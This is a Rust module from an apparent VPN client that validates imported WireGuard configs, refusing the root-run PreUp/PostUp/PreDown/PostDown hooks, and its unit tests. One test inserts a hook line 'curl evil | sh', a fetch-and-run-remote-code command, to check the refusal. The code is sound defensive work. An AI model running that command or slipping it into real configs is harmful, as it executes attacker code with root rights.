//! Direct profiles: connecting with a WireGuard config the user already has.
//!
//! The managed flow — sign in, register the device, get a session from the
//! control plane — is what a deployment runs. But a team with a WireGuard
//! server and a `.conf` per person should be able to open the app and connect
//! today, and add sign-in when the control plane is in front of that server.
//! This is that path: import the file once, then Connect and Disconnect bring
//! it up and down exactly as the managed flow does, through the same
//! privileged `wg-quick` invocation.
//!
//! The file is validated on import rather than handed to `wg-quick` as-is,
//! because `wg-quick` runs as root. `PreUp`, `PostUp`, `PreDown` and
//! `PostDown` are shell commands, and a config someone was sent by email would
//! otherwise run whatever it liked with the administrator rights the user
//! granted to "connect to the VPN". They are refused, and so is any key
//! `wg-quick` would not recognise, so a typo fails here with a line number
//! rather than later inside an authorization dialog.

use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use base64::Engine;
use serde::{Deserialize, Serialize};

use crate::state::{write_private_file, AgentState};
use crate::tunnel::{self, Escalation, TunnelState};

/// What the UI and `wsl status` show about an imported profile. The private
/// key stays in the file; it is never copied into agent state.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DirectProfile {
    pub name: String,
    pub endpoint: String,
    pub address: Vec<String>,
    pub dns: Vec<String>,
    pub allowed_ips: Vec<String>,
}

const INTERFACE_KEYS: &[&str] = &[
    "privatekey",
    "address",
    "dns",
    "mtu",
    "listenport",
    "table",
    "fwmark",
    "saveconfig",
];
const PEER_KEYS: &[&str] = &[
    "publickey",
    "presharedkey",
    "allowedips",
    "endpoint",
    "persistentkeepalive",
];
const HOOK_KEYS: &[&str] = &["preup", "postup", "predown", "postdown"];

#[derive(PartialEq)]
enum Section {
    None,
    Interface,
    Peer,
}

fn split_list(value: &str) -> Vec<String> {
    value
        .split(',')
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .collect()
}

fn is_key(value: &str) -> bool {
    base64::engine::general_purpose::STANDARD
        .decode(value.trim())
        .map(|bytes| bytes.len() == 32)
        .unwrap_or(false)
}

/// Check a wg-quick config and say what it connects to.
pub fn validate(text: &str, name: &str) -> Result<DirectProfile> {
    let mut section = Section::None;
    let mut interfaces = 0;
    let mut peers = 0;
    let mut private_key = false;
    let mut profile = DirectProfile {
        name: name.to_string(),
        endpoint: String::new(),
        address: Vec::new(),
        dns: Vec::new(),
        allowed_ips: Vec::new(),
    };
    let mut peer_has_key = true;
    let mut peer_has_allowed = true;

    let close_peer = |has_key: bool, has_allowed: bool, line: usize| -> Result<()> {
        if !has_key {
            bail!("the [Peer] ending before line {line} has no PublicKey");
        }
        if !has_allowed {
            bail!("the [Peer] ending before line {line} has no AllowedIPs");
        }
        Ok(())
    };

    for (index, raw) in text.lines().enumerate() {
        let line_no = index + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            if section == Section::Peer {
                close_peer(peer_has_key, peer_has_allowed, line_no)?;
            }
            section = match line.to_ascii_lowercase().as_str() {
                "[interface]" => {
                    interfaces += 1;
                    Section::Interface
                }
                "[peer]" => {
                    peers += 1;
                    peer_has_key = false;
                    peer_has_allowed = false;
                    Section::Peer
                }
                other => bail!("line {line_no}: unknown section {other}"),
            };
            continue;
        }
        let (key, value) = line
            .split_once('=')
            .with_context(|| format!("line {line_no}: expected `Key = value`"))?;
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();

        if HOOK_KEYS.contains(&key.as_str()) {
            bail!(
                "line {line_no}: {} runs a shell command as root when the tunnel \
                 changes state, so imported configs may not contain it. Remove the \
                 line and import again.",
                raw.split('=').next().unwrap_or("").trim()
            );
        }
        match section {
            Section::None => bail!("line {line_no}: `{key}` is outside any section"),
            Section::Interface => {
                if !INTERFACE_KEYS.contains(&key.as_str()) {
                    bail!("line {line_no}: `{key}` is not a WireGuard [Interface] setting");
                }
                match key.as_str() {
                    "privatekey" => {
                        if !is_key(value) {
                            bail!("line {line_no}: PrivateKey is not a WireGuard key");
                        }
                        private_key = true;
                    }
                    "address" => profile.address.extend(split_list(value)),
                    "dns" => profile.dns.extend(split_list(value)),
                    _ => {}
                }
            }
            Section::Peer => {
                if !PEER_KEYS.contains(&key.as_str()) {
                    bail!("line {line_no}: `{key}` is not a WireGuard [Peer] setting");
                }
                match key.as_str() {
                    "publickey" => {
                        if !is_key(value) {
                            bail!("line {line_no}: PublicKey is not a WireGuard key");
                        }
                        peer_has_key = true;
                    }
                    "presharedkey" if !is_key(value) => {
                        bail!("line {line_no}: PresharedKey is not a WireGuard key")
                    }
                    "allowedips" => {
                        peer_has_allowed = true;
                        profile.allowed_ips.extend(split_list(value));
                    }
                    "endpoint" if profile.endpoint.is_empty() => {
                        profile.endpoint = value.to_string()
                    }
                    _ => {}
                }
            }
        }
    }
    if section == Section::Peer {
        close_peer(peer_has_key, peer_has_allowed, text.lines().count() + 1)?;
    }
    if interfaces != 1 {
        bail!("a config needs exactly one [Interface] section, found {interfaces}");
    }
    if peers == 0 {
        bail!("the config has no [Peer]: there is no server to connect to");
    }
    if !private_key {
        bail!("[Interface] has no PrivateKey");
    }
    if profile.address.is_empty() {
        bail!("[Interface] has no Address");
    }
    if profile.endpoint.is_empty() {
        bail!("no [Peer] has an Endpoint, so there is nothing to connect to");
    }
    Ok(profile)
}

pub fn profile_conf_path() -> Result<PathBuf> {
    Ok(AgentState::data_dir()?.join("profile.conf"))
}

/// A display name from a file name: `office.conf` becomes `office`.
pub fn name_from_path(path: &Path) -> String {
    path.file_stem()
        .map(|s| s.to_string_lossy().into_owned())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "WireGuard".into())
}

/// Validate, store privately, and record the profile in agent state.
pub fn import(state: &mut AgentState, text: &str, name: &str) -> Result<DirectProfile> {
    let profile = validate(text, name)?;
    write_private_file(&profile_conf_path()?, text)?;
    state.profile = Some(profile.clone());
    state.save()?;
    Ok(profile)
}

/// Forget the profile. The tunnel must be down first: removing the file an
/// interface was brought up from leaves nothing to bring it down with.
pub fn remove(state: &mut AgentState) -> Result<()> {
    if tunnel::state().is_up() && state.session.is_none() && state.profile.is_some() {
        bail!("disconnect first; the tunnel is up from this profile");
    }
    let path = profile_conf_path()?;
    if path.exists() {
        std::fs::remove_file(&path).with_context(|| format!("removing {}", path.display()))?;
    }
    state.profile = None;
    state.save()?;
    Ok(())
}

/// Bring the tunnel up from the imported profile.
///
/// The profile is copied to the interface's config path, not used in place:
/// `wg-quick` names the interface after the file, and the rest of the agent
/// looks for it under that one name.
pub async fn connect(state: &AgentState, escalation: Escalation) -> Result<TunnelState> {
    if state.profile.is_none() {
        bail!("no WireGuard profile imported; run `wsl profile import <file>`");
    }
    let text = std::fs::read_to_string(profile_conf_path()?)
        .context("the imported profile is missing; import it again")?;
    let conf = AgentState::wg_conf_path()?;
    write_private_file(&conf, &text)?;
    // `--no-tunnel` means nothing without a session, so do not suggest it.
    tunnel::up_with_hint(&conf, escalation, "Re-run as `sudo wsl connect`.").await
}

pub async fn disconnect(escalation: Escalation) -> Result<()> {
    tunnel::down(&AgentState::wg_conf_path()?, escalation).await
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn good() -> String {
        format!(
            "[Interface]\nPrivateKey = {KEY}\nAddress = 10.8.0.2/32, fd00::2/128\nDNS = 10.8.0.1\n\n\
             [Peer]\nPublicKey = {PUB}\nEndpoint = vpn.example.com:51820\n\
             AllowedIPs = 10.8.0.0/24, 10.9.0.0/16\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn a_typical_client_config_is_accepted_and_summarised() {
        let p = validate(&good(), "office").unwrap();
        assert_eq!(p.name, "office");
        assert_eq!(p.endpoint, "vpn.example.com:51820");
        assert_eq!(p.address, vec!["10.8.0.2/32", "fd00::2/128"]);
        assert_eq!(p.dns, vec!["10.8.0.1"]);
        assert_eq!(p.allowed_ips, vec!["10.8.0.0/24", "10.9.0.0/16"]);
    }

    #[test]
    fn keys_and_sections_are_case_insensitive_like_wg_quick() {
        let text = good()
            .replace("[Interface]", "[interface]")
            .replace("PrivateKey", "privatekey");
        assert!(validate(&text, "x").is_ok());
    }

    /// wg-quick runs these as root. A config from an email must not.
    #[test]
    fn hook_commands_are_refused_with_the_reason() {
        for hook in ["PreUp", "PostUp", "PreDown", "PostDown"] {
            let text = good().replace(
                "DNS = 10.8.0.1",
                &format!("DNS = 10.8.0.1\n{hook} = curl evil | sh"),
            );
            let err = validate(&text, "x").unwrap_err().to_string();
            assert!(err.contains(hook), "{err}");
            assert!(err.contains("root"), "{err}");
            assert!(err.contains("line 5"), "{err}");
        }
    }

    #[test]
    fn an_unknown_key_is_named_with_its_line() {
        let text = good().replace("DNS = 10.8.0.1", "DNS = 10.8.0.1\nAdress = 10.0.0.1");
        let err = validate(&text, "x").unwrap_err().to_string();
        assert!(err.contains("line 5") && err.contains("adress"), "{err}");
    }

    #[test]
    fn a_config_with_no_peer_endpoint_has_nothing_to_connect_to() {
        let text = good().replace("Endpoint = vpn.example.com:51820\n", "");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("Endpoint"));
    }

    #[test]
    fn a_config_with_no_peer_is_refused() {
        let text = good();
        let text = &text[..text.find("[Peer]").unwrap()];
        assert!(validate(text, "x")
            .unwrap_err()
            .to_string()
            .contains("[Peer]"));
    }

    #[test]
    fn a_peer_without_allowed_ips_is_refused() {
        let text = good().replace("AllowedIPs = 10.8.0.0/24, 10.9.0.0/16\n", "");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("AllowedIPs"));
    }

    #[test]
    fn a_malformed_key_is_caught_here_not_in_wg_quick() {
        let text = good().replace(KEY, "not-a-key");
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("PrivateKey"));
    }

    #[test]
    fn missing_address_or_private_key_is_refused() {
        let no_addr = good().replace("Address = 10.8.0.2/32, fd00::2/128\n", "");
        assert!(validate(&no_addr, "x")
            .unwrap_err()
            .to_string()
            .contains("Address"));
        let no_key = good().replace(&format!("PrivateKey = {KEY}\n"), "");
        assert!(validate(&no_key, "x")
            .unwrap_err()
            .to_string()
            .contains("PrivateKey"));
    }

    #[test]
    fn two_interfaces_are_refused() {
        let text = format!("{}\n[Interface]\nAddress = 10.0.0.1/32\n", good());
        assert!(validate(&text, "x")
            .unwrap_err()
            .to_string()
            .contains("exactly one"));
    }

    #[test]
    fn comments_are_ignored_the_way_wg_quick_ignores_them() {
        let text = format!(
            "# exported from the server\n{}",
            good().replace("DNS = 10.8.0.1", "DNS = 10.8.0.1 # office")
        );
        assert_eq!(validate(&text, "x").unwrap().dns, vec!["10.8.0.1"]);
    }

    #[test]
    fn the_name_comes_from_the_file() {
        assert_eq!(name_from_path(Path::new("/tmp/office.conf")), "office");
        assert_eq!(name_from_path(Path::new("/")), "WireGuard");
    }
}
